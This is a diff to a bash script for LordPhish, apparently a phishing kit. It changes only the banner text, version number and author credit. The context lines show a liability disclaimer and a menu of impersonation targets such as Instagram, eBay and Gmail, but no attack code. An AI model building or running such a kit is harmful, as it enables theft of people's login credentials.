@@ -63,7 +63,7 @@ user_interrupt(){
         sleep 2
         printf "\e[0m\n"
         printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44>"
-        printf " \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;96m Visit github.com/Ch33chOficial \e[0m"
+        printf " \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;96m Visit github.com/grenoxx \e[0m"
         printf "\e[0m\n"
         exit 1
 }              
@@ -92,9 +92,9 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m  .:.  Version 1.8 Beta  .:.  \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.9 Beta  .:.  \e[0m\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
+printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
 printf "\n"
 printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by LordPhish.  ::\e[0m\n"
@@ -128,9 +128,9 @@ echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
 echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
 echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
 echo
-printf "      \e[1;97m  .:.  Version 1.8 Beta  .:.   \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.9 Beta  .:.   \e[0m\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
+printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;96m eBay   \e[0m          \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;96m Gmail   \e[0m   \n"  
 
